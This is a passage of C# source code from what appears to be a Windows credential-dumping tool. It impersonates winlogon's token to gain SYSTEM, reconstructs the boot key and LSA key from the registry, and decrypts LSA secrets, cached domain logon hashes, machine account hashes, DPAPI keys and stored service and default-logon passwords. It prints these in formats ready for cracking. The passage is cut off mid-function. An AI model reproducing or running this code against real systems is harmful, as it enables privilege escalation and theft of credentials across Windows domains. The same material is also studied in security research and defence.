        private static byte[] OCADD(byte[] leftBuffer, byte[] rightBuffer)
        {
            // check inputs
            if (null == leftBuffer)
            {
                throw new ArgumentNullException("leftBuffer");
            }
            if (null == rightBuffer)
            {
                throw new ArgumentNullException("rightBuffer");
            }
            if (leftBuffer.Length != rightBuffer.Length)
            {
                throw new ArgumentException("The input buffer lengths should be equal");
            }

            // initialize sum buffer
            byte[] sumBuffer = new byte[leftBuffer.Length];
            byte[] zeroBuffer = new byte[leftBuffer.Length];

            // the carry value
            int carry = 0;
            for (int i = leftBuffer.Length - 1; i >= 0; i--)
            {
                // caculate sum
                int sum = leftBuffer[i] + rightBuffer[i] + carry;
                sumBuffer[i] = (byte)(sum & 0xff);

                // reset carry
                if (sum > 0xff)
                {
                    carry = 1;
                }
                else
                {
                    carry = 0;
                }
            }

            // if there is a left over carry bit, add it back in
            if (1 == carry)
            {
                bool done = false;
                for (int j = leftBuffer.Length - 1; j >= 0; j--)
                {
                    if (sumBuffer[j] != 0xff)
                    {
                        sumBuffer[j]++;
                        done = true;
                        break;
                    }
                }

                if (!done)
                {
                    Array.Copy(zeroBuffer, sumBuffer, zeroBuffer.Length);
                }
            }
            return sumBuffer;
        }
        #endregion Private Methods


        #region Internal Methods

        /// <summary>
        /// Generate an encryption key from password and salt
        /// [RFC 3962 Section 4 Key Generation from Pass Phrases or Random Data]
        /// (The pseudorandom function used by PBKDF2 will be a SHA-1 HMAC of 
        /// the passphrase and salt, as described in Appendix B.1 to PKCS#5)
        /// </summary>
        /// <param name="password">password</param>
        /// <param name="salt">salt</param>
        /// <param name="iterationCount">interation count</param>
        /// <param name="keyType">AES key type which decides key size</param>
        /// <returns>the encrypted key in bytes</returns>
        internal static byte[] MakeStringToKey(
            string password,
            string salt,
            uint iterationCount,
            AesKeyType keyType)
        {
            if (null == password)
            {
                throw new ArgumentNullException("password");
            }
            if (null == salt)
            {
                throw new ArgumentNullException("salt");
            }

            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            byte[] saltBytes = Encoding.UTF8.GetBytes(salt);
            int keySize = (int)keyType / ConstValue.BYTE_SIZE;

            // generate the intermediate key
            Rfc2898DeriveBytes PBKDF2 = new Rfc2898DeriveBytes(passwordBytes, saltBytes, (int)iterationCount);
            byte[] intermediateKey = PBKDF2.GetBytes(keySize);
            intermediateKey = RandomToKey(intermediateKey);

            // generate the final key
            return DK(intermediateKey, KERBEROS_CONSTANT, keyType);
        }
        #endregion Internal Methods
    }

    internal static class Crypto
    {
        public static byte[] LSAAESDecrypt(byte[] key, byte[] data)
        {
            var aesCryptoProvider = new AesManaged();

            aesCryptoProvider.Key = key;
            aesCryptoProvider.IV = new byte[16];
            aesCryptoProvider.Mode = CipherMode.CBC;
            aesCryptoProvider.BlockSize = 128;
            aesCryptoProvider.Padding = PaddingMode.Zeros;
            var transform = aesCryptoProvider.CreateDecryptor();

            var chunks = Decimal.ToInt32(Math.Ceiling((decimal)data.Length / (decimal)16));
            var plaintext = new byte[chunks * 16];

            for (var i = 0; i < chunks; ++i)
            {
                var offset = i * 16;
                var chunk = new byte[16];
                Array.Copy(data, offset, chunk, 0, 16);

                var chunkPlaintextBytes = transform.TransformFinalBlock(chunk, 0, chunk.Length);
                Array.Copy(chunkPlaintextBytes, 0, plaintext, i * 16, 16);
            }

            return plaintext;
        }

        // https://rosettacode.org/wiki/MD4
        public static byte[] Md4Hash2(this byte[] input)
        {
            // get padded uints from bytes
            List<byte> bytes = input.ToList();
            uint bitCount = (uint)(bytes.Count) * 8;
            bytes.Add(128);
            while (bytes.Count % 64 != 56) bytes.Add(0);
            var uints = new List<uint>();
            for (int i = 0; i + 3 < bytes.Count; i += 4)
                uints.Add(bytes[i] | (uint)bytes[i + 1] << 8 | (uint)bytes[i + 2] << 16 | (uint)bytes[i + 3] << 24);
            uints.Add(bitCount);
            uints.Add(0);

            // run rounds
            uint a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
            Func<uint, uint, uint> rol = (x, y) => x << (int)y | x >> 32 - (int)y;
            for (int q = 0; q + 15 < uints.Count; q += 16)
            {
                var chunk = uints.GetRange(q, 16);
                uint aa = a, bb = b, cc = c, dd = d;
                Action<Func<uint, uint, uint, uint>, uint[]> round = (f, y) =>
                {
                    foreach (uint i in new[] { y[0], y[1], y[2], y[3] })
                    {
                        a = rol(a + f(b, c, d) + chunk[(int)(i + y[4])] + y[12], y[8]);
                        d = rol(d + f(a, b, c) + chunk[(int)(i + y[5])] + y[12], y[9]);
                        c = rol(c + f(d, a, b) + chunk[(int)(i + y[6])] + y[12], y[10]);
                        b = rol(b + f(c, d, a) + chunk[(int)(i + y[7])] + y[12], y[11]);
                    }
                };
                round((x, y, z) => (x & y) | (~x & z), new uint[] { 0, 4, 8, 12, 0, 1, 2, 3, 3, 7, 11, 19, 0 });
                round((x, y, z) => (x & y) | (x & z) | (y & z), new uint[] { 0, 1, 2, 3, 0, 4, 8, 12, 3, 5, 9, 13, 0x5a827999 });
                round((x, y, z) => x ^ y ^ z, new uint[] { 0, 2, 1, 3, 0, 8, 4, 12, 3, 9, 11, 15, 0x6ed9eba1 });
                a += aa; b += bb; c += cc; d += dd;
            }
            // return hex encoded string
            byte[] outBytes = new[] { a, b, c, d }.SelectMany(BitConverter.GetBytes).ToArray();
            return outBytes;
        }

        public static byte[] LSASHA256Hash(byte[] key, byte[] rawData)
        {
            // yay
            using (var sha256Hash = SHA256.Create())
            {
                var buffer = new byte[key.Length + (rawData.Length * 1000)];
                Array.Copy(key, 0, buffer, 0, key.Length);
                for (var i = 0; i < 1000; ++i)
                {
                    Array.Copy(rawData, 0, buffer, key.Length + (i * rawData.Length), rawData.Length);
                }
                return sha256Hash.ComputeHash(buffer);
            }
        }

        // https://stackoverflow.com/questions/7217627/is-there-anything-wrong-with-this-rc4-encryption-code-in-c-sharp
        internal static byte[] RC4Encrypt(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        internal static byte[] DecryptAES_CBC(byte[] value, byte[] key, byte[] iv)
        {
            AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
            aes.BlockSize = 128;
            aes.Key = key;
            aes.Mode = CipherMode.CBC;
            aes.IV = iv;
            // you would think this would work to pad out the rest of the final block to 16, but it doesnt? ¯\_(ツ)_/¯
            aes.Padding = PaddingMode.Zeros;

            int tailLength = value.Length % 16;
            if (tailLength != 0)
            {
                List<byte> manualPadding = new List<byte>();
                for (int i = 16 - tailLength; i > 0; i--)
                {
                    manualPadding.Add(0x00);
                }
                byte[] concat = new byte[value.Length + manualPadding.Count];
                System.Buffer.BlockCopy(value, 0, concat, 0, value.Length);
                System.Buffer.BlockCopy(manualPadding.ToArray(), 0, concat, value.Length, manualPadding.Count);
                value = concat;
            }

            using (ICryptoTransform decrypt = aes.CreateDecryptor())
            {
                byte[] dest = decrypt.TransformFinalBlock(value, 0, value.Length);
                return dest;
            }
        }

        internal static string DecryptSingleHash(byte[] obfuscatedHash, string user)
        {
            List<byte> key1 = new List<byte>();
            List<byte> key2 = new List<byte>();

            RidToKey(user, ref key1, ref key2);

            byte[] hashBytes1 = new byte[8];
            byte[] hashBytes2 = new byte[8];
            Buffer.BlockCopy(obfuscatedHash, 0, hashBytes1, 0, 8);
            Buffer.BlockCopy(obfuscatedHash, 8, hashBytes2, 0, 8);

            byte[] plain1 = DeObfuscateHashPart(hashBytes1, key1);
            byte[] plain2 = DeObfuscateHashPart(hashBytes2, key2);

            return (BitConverter.ToString(plain1) + BitConverter.ToString(plain2));
        }

        // method from SidToKey - https://github.com/woanware/ForensicUserInfo/blob/master/Source/SamParser.cs
        private static void RidToKey(string hexRid, ref List<byte> key1, ref List<byte> key2)
        {
            int rid = Int32.Parse(hexRid, System.Globalization.NumberStyles.HexNumber);
            List<byte> temp1 = new List<byte>();

            byte temp = (byte)(rid & 0xFF);
            temp1.Add(temp);

            temp = (byte)(((rid >> 8) & 0xFF));
            temp1.Add(temp);

            temp = (byte)(((rid >> 16) & 0xFF));
            temp1.Add(temp);

            temp = (byte)(((rid >> 24) & 0xFF));
            temp1.Add(temp);

            temp1.Add(temp1[0]);
            temp1.Add(temp1[1]);
            temp1.Add(temp1[2]);

            List<byte> temp2 = new List<byte>();
            temp2.Add(temp1[3]);
            temp2.Add(temp1[0]);
            temp2.Add(temp1[1]);
            temp2.Add(temp1[2]);

            temp2.Add(temp2[0]);
            temp2.Add(temp2[1]);
            temp2.Add(temp2[2]);

            key1 = TransformKey(temp1);
            key2 = TransformKey(temp2);
        }

        private static List<byte> TransformKey(List<byte> inputData)
        {
            List<byte> data = new List<byte>();
            data.Add(Convert.ToByte(((inputData[0] >> 1) & 0x7f) << 1));
            data.Add(Convert.ToByte(((inputData[0] & 0x01) << 6 | ((inputData[1] >> 2) & 0x3f)) << 1));
            data.Add(Convert.ToByte(((inputData[1] & 0x03) << 5 | ((inputData[2] >> 3) & 0x1f)) << 1));
            data.Add(Convert.ToByte(((inputData[2] & 0x07) << 4 | ((inputData[3] >> 4) & 0x0f)) << 1));
            data.Add(Convert.ToByte(((inputData[3] & 0x0f) << 3 | ((inputData[4] >> 5) & 0x07)) << 1));
            data.Add(Convert.ToByte(((inputData[4] & 0x1f) << 2 | ((inputData[5] >> 6) & 0x03)) << 1));
            data.Add(Convert.ToByte(((inputData[5] & 0x3f) << 1 | ((inputData[6] >> 7) & 0x01)) << 1));
            data.Add(Convert.ToByte((inputData[6] & 0x7f) << 1));
            return data;
        }

        //from https://github.com/woanware/ForensicUserInfo/blob/master/Source/SamParser.cs
        private static byte[] DeObfuscateHashPart(byte[] obfuscatedHash, List<byte> key)
        {
            DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
            cryptoProvider.Padding = PaddingMode.None;
            cryptoProvider.Mode = CipherMode.ECB;
            ICryptoTransform transform = cryptoProvider.CreateDecryptor(key.ToArray(), new byte[] { 0, 0, 0, 0, 0, 0, 0, 0 });
            MemoryStream memoryStream = new MemoryStream(obfuscatedHash);
            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
            byte[] plainTextBytes = new byte[obfuscatedHash.Length];
            int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
            return plainTextBytes;
        }
    }

    internal class NL_Record
    {
        public NL_Record(byte[] inputData)
        {
            userLength = BitConverter.ToInt16(inputData.Take(2).ToArray(), 0);
            domainNameLength = BitConverter.ToInt16(inputData.Skip(2).Take(2).ToArray(), 0);
            dnsDomainLength = BitConverter.ToInt16(inputData.Skip(60).Take(2).ToArray(), 0);
            IV = inputData.Skip(64).Take(16).ToArray();
            encryptedData = inputData.Skip(96).Take(inputData.Length - 96).ToArray();
            lastWrite = DateTime.FromFileTimeUtc(BitConverter.ToInt64(inputData.Skip(32).Take(8).ToArray(), 0));
        }
        public int userLength { get; set; }
        public int domainNameLength { get; set; }
        public int dnsDomainLength { get; set; }
        public byte[] IV { get; set; }
        public byte[] encryptedData { get; set; }
        public DateTime lastWrite { get; set; }
    }

    internal class LsaSecretBlob
    {
        public LsaSecretBlob(byte[] inputData)
        {
            length = BitConverter.ToInt16(inputData.Take(4).ToArray(), 0);
            unk = inputData.Skip(4).Take(12).ToArray();
            secret = inputData.Skip(16).Take(length).ToArray();
        }

        public int length { get; set; }
        public byte[] unk { get; set; }
        public byte[] secret { get; set; }
    }

    public class LSADump
    {
        public static byte[] GetLSASecret(string secretName, byte[] LSAKey)
        {
            string keyPath = String.Format("SECURITY\\Policy\\Secrets\\{0}\\CurrVal", secretName);
            byte[] keyData = Helpers.GetRegKeyValue(keyPath);

            if (keyData == null)
                return null;

            byte[] keyEncryptedData = new byte[keyData.Length - 28];
            Array.Copy(keyData, 28, keyEncryptedData, 0, keyEncryptedData.Length);

            // calculate the temp key by using the LSA key to calculate the Sha256 hash on the first 32 bytes
            //  of the extracted secret data
            byte[] keyEncryptedDataEncryptedKey = new byte[32];
            Array.Copy(keyEncryptedData, 0, keyEncryptedDataEncryptedKey, 0, 32);
            byte[] tmpKey = Crypto.LSASHA256Hash(LSAKey, keyEncryptedDataEncryptedKey);

            // use the temp key to decrypt the rest of the plaintext
            byte[] keyEncryptedDataRemainder = new byte[keyEncryptedData.Length - 32];
            Array.Copy(keyEncryptedData, 32, keyEncryptedDataRemainder, 0, keyEncryptedDataRemainder.Length);
            byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);

            return keyPathPlaintext;
        }

        public static byte[] GetLSAKey(byte[] bootkey)
        {
            byte[] LSAKeyEncryptedStruct = Helpers.GetRegKeyValue(@"SECURITY\Policy\PolEKList");
            byte[] LSAEncryptedData = new byte[LSAKeyEncryptedStruct.Length - 28];
            Array.Copy(LSAKeyEncryptedStruct, 28, LSAEncryptedData, 0, LSAEncryptedData.Length);

            // calculate the temp key by using the boot key to calculate the Sha256 hash on the first 32 bytes
            //  of the LSA key data
            byte[] LSAEncryptedDataEncryptedKey = new byte[32];
            Array.Copy(LSAEncryptedData, 0, LSAEncryptedDataEncryptedKey, 0, 32);
            byte[] tmpKey = Crypto.LSASHA256Hash(bootkey, LSAEncryptedDataEncryptedKey);

            // use the temp key to decrypt the rest of the LSA struct
            byte[] LSAEncryptedDataRemainder = new byte[LSAEncryptedData.Length - 32];
            Array.Copy(LSAEncryptedData, 32, LSAEncryptedDataRemainder, 0, LSAEncryptedDataRemainder.Length);
            byte[] IV = new byte[16];
            byte[] LSAKeyStructPlaintext = Crypto.LSAAESDecrypt(tmpKey, LSAEncryptedDataRemainder);

            byte[] LSAKey = new byte[32];
            Array.Copy(LSAKeyStructPlaintext, 68, LSAKey, 0, 32);

            return LSAKey;
        }

        public static byte[] GetBootKey()
        {
            // returns the system boot key (aka syskey) that's later used to calculate the LSA key

            StringBuilder scrambledKey = new StringBuilder();

            foreach (string key in new string[] { "JD", "Skew1", "GBG", "Data" })
            {
                string keyPath = String.Format("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{0}", key);
                StringBuilder classVal = new StringBuilder(1024);
                int len = 1024;
                int result = 0;
                IntPtr hKey = IntPtr.Zero;
                IntPtr dummy = IntPtr.Zero;

                // open the specified key with read (0x19) privileges
                //  0x80000002 == HKLM
                result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
                    return null;
                }

                result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                    return null;
                }
                Interop.RegCloseKey(hKey);

                scrambledKey.Append(classVal);
            }

            // reference: https://github.com/brandonprry/gray_hat_csharp_code/blob/e1d5fc2a497ae443225d840718adde836ffaeefe/ch14_reading_offline_hives/Program.cs#L74-L82
            byte[] skey = Helpers.StringToByteArray(scrambledKey.ToString());
            byte[] descramble = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                                             0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

            byte[] bootkey = new byte[16];
            for (int i = 0; i < bootkey.Length; i++)
                bootkey[i] = skey[descramble[i]];

            return bootkey;
        }
    }

    public class Interop
    {
        // for GetSystem()
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(
            IntPtr hObject
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        // for LSA Secrets Dump
        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegOpenKeyEx(
            uint hKey,
            string subKey,
            int ulOptions,
            int samDesired,
            ref IntPtr hkResult
        );

        [DllImport("advapi32.dll")]
        public static extern int RegQueryInfoKey(
            IntPtr hkey,
            StringBuilder lpClass,
            ref int lpcbClass,
            int lpReserved,
            ref IntPtr lpcSubKeys,
            ref IntPtr lpcbMaxSubKeyLen,
            ref IntPtr lpcbMaxClassLen,
            ref IntPtr lpcValues,
            ref IntPtr lpcbMaxValueNameLen,
            ref IntPtr lpcbMaxValueLen,
            ref IntPtr lpcbSecurityDescriptor,
            IntPtr lpftLastWriteTime
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegEnumKeyEx(
            IntPtr hKey,
            int dwIndex,
            StringBuilder lpName,
            ref int lpcchName,
            IntPtr lpReserved,
            IntPtr lpClass,
            IntPtr lpcchClass,
            ref IntPtr lpftLastWriteTime
            );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegEnumValue(
            IntPtr hKey,
            int dwIndex,
            StringBuilder lpValueName,
            ref int lpcchValueName,
            int lpReserved,
            IntPtr lpType,
            IntPtr lpDate,
            IntPtr lpcbData
            );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegQueryValueEx(
            IntPtr hKey,
            string lpValueName,
            int lpReserved,
            IntPtr type,
            IntPtr lpData,
            ref int lpcbData
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(
            IntPtr hKey
        );
    }

    public static class Helpers
    {
        public static bool GetSystem()
        {
            // helper to elevate to SYSTEM via token impersonation
            //  used for LSA secret (DPAPI_SYSTEM) retrieval
            if (IsHighIntegrity())
            {
                IntPtr hToken = IntPtr.Zero;

                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                // TOKEN_DUPLICATE = 0x0002
                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
                if (!success)
                {
                    //Console.WriteLine("OpenProcessToken failed!");
                    return false;
                }

                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                // 2 == SecurityImpersonation
                IntPtr hDupToken = IntPtr.Zero;
                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    //Console.WriteLine("DuplicateToken failed!");
                    return false;
                }

                success = Interop.ImpersonateLoggedOnUser(hDupToken);
                if (!success)
                {
                    //Console.WriteLine("ImpersonateLoggedOnUser failed!");
                    return false;
                }

                // clean up the handles we created
                Interop.CloseHandle(hToken);
                Interop.CloseHandle(hDupToken);

                bool isSystem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;
                if (!isSystem)
                {
                    return false;
                }

                return true;
            }
            else
            {
                return false;
            }
        }

        public static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
        {
            byte[] domainData = fVal.Skip(104).ToArray();
            byte[] hashedBootKey;

            //old style hashed bootkey storage
            if (domainData[0].Equals(0x01))
            {
                byte[] f70 = fVal.Skip(112).Take(16).ToArray();
                List<byte> data = new List<byte>();
                data.AddRange(f70);
                data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
                data.AddRange(bootKey);
                data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
                byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
                byte[] f80 = fVal.Skip(128).Take(32).ToArray();
                hashedBootKey = Crypto.RC4Encrypt(md5, f80);
            }

            //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
            else if (domainData[0].Equals(0x02))
            {
                byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
                int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
                // int offset = BitConverter.ToInt32(v,12) + 204;
                byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
                hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
            }
            else
            {
                Console.WriteLine("[-] Error parsing hashed bootkey");
                return null;
            }
            return hashedBootKey;
        }

        public static void GetDefaultLogon()
        {
            byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName", true);
            byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName", true);
            byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword", true);
            string username;
            if (usernameArr != null)
            {
                username = Encoding.ASCII.GetString(usernameArr);
                username = username.Remove(username.Length - 1);
            }
            else
            {
                username = "(Unkown User)";
            }
            if (domainArr != null)
            {
                string domain = Encoding.ASCII.GetString(domainArr);
                domain = domain.Remove(domain.Length - 1);
                username = String.Format("{0}\\{1}", domain, username);
            }
            if (usernameArr != null && passwordArr != null)
            {
                Console.WriteLine("[*] DEFAULTPASSWORD");
                string password = Encoding.ASCII.GetString(passwordArr);
                password = password.Remove(password.Length - 1);
                Console.WriteLine(String.Format("{0}:{1}", username, password));
            }
        }

        public static void GetLsaSecrets(byte[] bootKey)
        {
            try
            {
                byte[] decryptedLsaKey = LSADump.GetLSAKey(bootKey);

                //get NLKM Secret
                byte[] nlkmKey = LSADump.GetLSASecret("NL$KM", decryptedLsaKey);

                IntPtr hKey = IntPtr.Zero;
                IntPtr dummy = IntPtr.Zero;
                String keyPath = "SECURITY\\Cache";
                int len = 1024;
                int result;
                StringBuilder classVal = new StringBuilder(1024);
                IntPtr number = IntPtr.Zero;

                if (nlkmKey != null && nlkmKey.Length > 0)
                {
                    result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
                    if (result != 0)
                    {
                        string errorMessage = new Win32Exception((int)result).Message;
                        Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, result, errorMessage);
                    }
                    result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy,
                            ref number, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
                    if (result != 0)
                    {
                        string errorMessage = new Win32Exception((int)result).Message;
                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                    }

                    Console.WriteLine("[*] Dumping cached domain logon information (domain/username:hash)");
                    byte[] data;
                    string valueName;
                    for (int i = 0; i < number.ToInt32(); i++)
                    {
                        len = 255;
                        classVal = new StringBuilder(len);
                        dummy = IntPtr.Zero;
                        result = Interop.RegEnumValue(hKey, i, classVal, ref len, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                        if (result != 0)
                        {
                            string errorMessage = new Win32Exception((int)result).Message;
                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                            return;
                        }

                        valueName = classVal.ToString();
                        data = GetRegKeyValue(keyPath, valueName);

                        if (string.Compare(valueName, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0
                                && !IsZeroes(data.Take(16).ToArray()))
                        {
                            NL_Record cachedUser = new NL_Record(data);
                            byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
                            byte[] hashedPW = plaintext.Take(16).ToArray();
                            string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
                            string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength)
                                + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                            domain = domain.Replace("\0", "");
                            Console.WriteLine(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}: ({4})", domain,
                                    username, username, Hexlify(hashedPW),
                                    cachedUser.lastWrite.ToString("yyyy-MM-dd HH:mm:ss")));
                        }
                    }
                }

                Interop.RegCloseKey(hKey);

                try
                {
                    Console.WriteLine("[*] Dumping LSA Secrets");
                    keyPath = "SECURITY\\Policy\\Secrets";
                    classVal = new StringBuilder(1024);
                    len = 1024;
                    result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
                    if (result != 0)
                    {
                        string errorMessage = new Win32Exception((int)result).Message;
                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                        return;
                    }
                    number = IntPtr.Zero;
                    result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref number, ref dummy, ref dummy,
                            ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
                    if (result != 0)
                    {
                        string errorMessage = new Win32Exception((int)result).Message;
                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                        return;
                    }

                    for (int i = 0; i < number.ToInt32(); i++)
                    {
                        len = 255;
                        result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
                        if (result != 0)
                        {
                            string errorMessage = new Win32Exception((int)result).Message;
                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                            return;
                        }

                        string secret = classVal.ToString();

                        if (string.Compare(secret, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
                        {
                            if (string.Compare(secret, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(LSADump.GetLSASecret(secret, decryptedLsaKey));
                                if (secretBlob.length > 0)
                                {
                                    Console.WriteLine(String.Format("[*] {0}", secret));
                                    if (secret.ToUpper().StartsWith("$MACHINE.ACC"))
                                    {
                                        string computerAcctHash = Hexlify(Crypto.Md4Hash2(secretBlob.secret));
                                        string domainName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Domain")).Trim('\0').ToUpper();
                                        string computerName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Hostname")).Trim('\0');

                                        PrintMachineKerberos(secretBlob.secret, domainName, computerName);

                                        Console.WriteLine(string.Format("{0}\\{1}$:plain_password_hex:{2}", domainName, computerName, Hexlify(secretBlob.secret)));
                                        Console.WriteLine(string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}:::", domainName, computerName, computerAcctHash));
                                    }
                                    else if (secret.ToUpper().StartsWith("DPAPI"))
                                    {
                                        Console.WriteLine("dpapi_machinekey:0x" + Hexlify(secretBlob.secret.Skip(4).Take(20).ToArray()));
                                        Console.WriteLine("dpapi_userkey:0x" + Hexlify(secretBlob.secret.Skip(24).Take(20).ToArray()));
                                    }
                                    else if (secret.ToUpper().StartsWith("_SC_"))
                                    {
                                        string startName = Encoding.ASCII.GetString(GetRegKeyValue(String.Format("SYSTEM\\ControlSet001\\Services\\{0}", secret.Substring(4)), "ObjectName")).Trim('\0');
                                        string pw = Encoding.Unicode.GetString(secretBlob.secret);
                                        Console.WriteLine(String.Format("{0}:{1}", startName, pw));
                                    }
                                    else if (secret.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
                                    {
                                        Console.WriteLine(String.Format("ASPNET:{0}", Encoding.Unicode.GetString(secretBlob.secret)));
                                    }
                                    else if (secret.ToUpper().StartsWith("DEFAULTPASSWORD"))
                                    {
                                        byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName", true);
                                        byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName", true);
                                        byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword", true);
                                        string username;
                                        if (usernameArr != null)
                                        {
                                            username = Encoding.ASCII.GetString(usernameArr);
                                            username = username.Remove(username.Length - 1);
                                        }
                                        else
                                        {
                                            username = "(Unkown User)";
                                        }
                                        if (domainArr != null)
                                        {
                                            string domain = Encoding.ASCII.GetString(domainArr);
                                            domain = domain.Remove(domain.Length - 1);
                                            username = String.Format("{0}\\{1}", domain, username);
                                        }
                                        Console.WriteLine(String.Format("{0}:{1}", username, Encoding.Unicode.GetString(secretBlob.secret)));
                                        // For some reason password can be also defined in Winlogon
                                        if (passwordArr != null)
                                        {
                                            string password = Encoding.ASCII.GetString(passwordArr);
                                            password = password.Remove(password.Length - 1);
